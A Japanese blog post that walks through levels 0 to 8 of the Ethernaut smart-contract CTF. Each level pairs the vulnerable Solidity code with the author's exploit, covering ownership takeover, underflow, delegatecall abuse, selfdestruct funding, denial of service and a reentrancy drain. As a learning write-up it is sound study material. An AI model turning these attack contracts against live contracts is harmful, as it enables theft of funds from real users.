---
title: "スマートコントラクトのCTF Ethernaut"
date: "2018-01-05T00:27:39+09:00"
---

最近Ethereumとスマートコントラクトの勉強をしている。まずは
[堅牢なスマートコントラクト開発のためのブロックチェーン技術入門](http://amzn.asia/1cShVGt)
という本を読み、次のステップとして、スマートコントラクトの脆弱性を突くCTFライ
クなゲーム [Ethernaut](https://ethernaut.zeppelin.solutions/) をプレイした。
無事にクリアできたので、以下に各問題の解答と説明をメモしておく。

## 0. Hello Ethernaut

この問題はチュートリアル的な位置付けで、コントラクトのメソッドを指示に従って
順に呼び出していくだけ。コントラクトのメソッドはPromiseを返すので、awaitを使う
と楽に書ける。以降の解答ではawaitを省略する。

```solidity
await contract.info()
await contract.info1()
await contract.info2("hello")
await contract.infoNum()
await contract.info42()
await contract.theMethodName()
await contract.method7123949()
await contract.password()
await contract.authenticate("ethernaut0")
```

## 1. Fallback

対象のコントラクトは下記の通り:

```solidity
contract Fallback is Ownable {

  mapping(address => uint) public contributions;

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function() payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }

  ...
}
```

Fallbackメソッドで `msg.sender` の中身をチェックせずに、 `owner` に代入して
いる。 あとは、 `require` の中身の条件を満たしてやれば良い ので、 fallbackメソ
ッドを呼び出す前に、`.contribute()` を 呼び出して `contributions` を増やしてお
く。

```solidity
contract.contribute({value: 1})
contract.send(1)
contract.withdraw()
```

## 2. Fallout

```solidity
contract Fallout is Ownable {

  mapping (address => uint) allocations;

  /* constructor */
  function Fal1out() payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  ...
}
```

コントラクトのコンストラクタ名にタイポがあり、ただのメソッドになってしまってい
る。

```solidity
await contract.Fal1out()
```

こんなバグ本当に起きるのかという気がするが、リファクタリング漏れで実際に
発生したことがあるらしい。

## 3. Token

```solidity
contract Token {
  mapping(address => uint) balances;
  uint public totalSupply;

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  ...
}
```

`_value > balances[msg.sender]` のときに、アンダーフローが発生してしまう。
初期状態で `balances[player]` に20 weiチャージされていたので、21 weiをtransfer
すればアンダーフローが発生する。

```solidity
await contract.transfer(player, 21)
```

## 4. Delegation

```solidity
contract Delegate {

  address public owner;

  function Delegate(address _owner) {
    owner = _owner;
  }

  function pwn() {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}
```

Fallbackメソッドで、`msg.data` の中身をチェックせずにdelegatecallしている。
Delegatecallというのは、別コントラクトのメソッドを、呼び出し元コントラクトの
コンテキストで呼び出す仕組み。つまり、呼び出し先で、呼び出し元のストレージを
読み書きすることができる。
この場合においては、 `Delegate.pwn()` をdelegatecallすれば、 `Delegation` コン
トラクトを `owner` を上書きできる。

```solidity
await contract.sendTransaction({data: web3.sha3("pwn()").substring(0, 10)})
```

## 5. Force


```solidity
contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

`selfdestruct(address)` という組み込み関数を使う。 この関数を使用す
ると、自身のコントラクトコードをストレージから削除し、全ての残高を `address`
へ送金できる。このとき、 `address` にpayableなメソッドが存在しなくてもよい。
この問題以降は、自分で攻撃用のコントラクトを書 いてデプロイする
必要がある。自分の場合は、 [Remix](https://remix.ethereum.org/) を使った。

```solidity
contract Attacker {
    function Attacker() public payable {
        address victim = 0x1384Dee841458867C7DD45e2263CD485E5c96567;
        selfdestruct(victim);
    }
}
```

コントラクトのデプロイ時にetherを付与しおく必要がある。

## 6. King

```solidity
contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}
```

`king.transfer(msg.value);` が失敗することを想定していない。
Payableなメソッドが存在しないコントラクトから一回送金すれば、以降は
`king.transfer(msg.value);` で常に例外が発生して、 `king` が更新不可能になる。

```solidity
contract Attacker {
    function Attacker() public payable {
        address victim = 0x3C4d1E25Cc0B115E3a9b1c0D04bEFbE94406C83E;
        victim.call.gas(1000000).value(msg.value)();
    }
}
```

最初は `victim.send(msg.value);` と書いていたのだが、out of gas例外が発生して
上手く動かなかった。調べると、 `send()` は呼び出し先へのメソッドへgasを伝播
しないということが[わかった](https://ethereum.stackexchange.com/questions/6470/send-vs-call-differences-and-when-to-use-and-when-not-to-use)。
`King` コントラクトのfallbackメソッドでは、ストレージへ書くなどgasコストが高い
処理をしているので、out of gas例外が発生していたというわけだ。そこで、
`.call.value()` へ書き換えた。それでもgasが足りなかったので、明示的に
gasを付与するようにした。

## 7. Re-entrance

```solidity
contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  ...

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  ...
}
```

`withdraw()` がリエントラントでない。受取先のコントラクトのfallbackメソッドで
`withdraw()` を呼べば、相互再帰が発生して、`Reentrance` コントラクトの残高か
gasが尽きるまで `withdraw()` が繰り返し実行される。

```solidity
contract Attacker {
    address constant victim = 0x0f4108dae2ab39f5c6fc7855dbbe8f8a988be112;

    function exec() public payable {
        victim.call.value(0.1 ether)(bytes4(keccak256("donate(address)")), this);
        victim.call(bytes4(keccak256("withdraw(uint256)")), 0.1 ether);
    }

    function() public payable {
        victim.call(bytes4(keccak256("withdraw(uint256)")), 0.1 ether);
    }
}
```

ちなみに、最初は `withdraw()` のメソッドIDを得る部分を
`bytes4(keccak256("withdraw(uint)"))` と書いていたのだが、上手く動かなかった。
正しくは `bytes4(keccak256("withdraw(uint256)"))` のようだ。

## 8. Elevator

```solidity
interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

`Building.isLastFloor()` の1回目の呼び出しではfalseを返し、2回目の呼び出しでは
trueを返せば `top` をtrueにできる。

```solidity
contract Elevator {
    function goTo(uint) public;
}

contract FakeBuilding {
    bool flag;

    function FakeBuilding() public {
        flag = true;
    }

    function goTo(uint) public {
        Elevator elevator =  Elevator(0xfe0206670305a64e6edc0a3c28f206eb8f508355);
        elevator.goTo(100);
    }

    function isLastFloor(uint) public returns (bool) {
        flag = !flag;
        return flag;
    }
}
```

`isLastFloor()` のシグネイチャにはC++でいうconstを意味する `view` 属性が付いて
いるので、本来はストレージの書き換えはコンパイルエラーになるべきなのだが、
(現状では) Solidityのコンパイラは通してしまう。
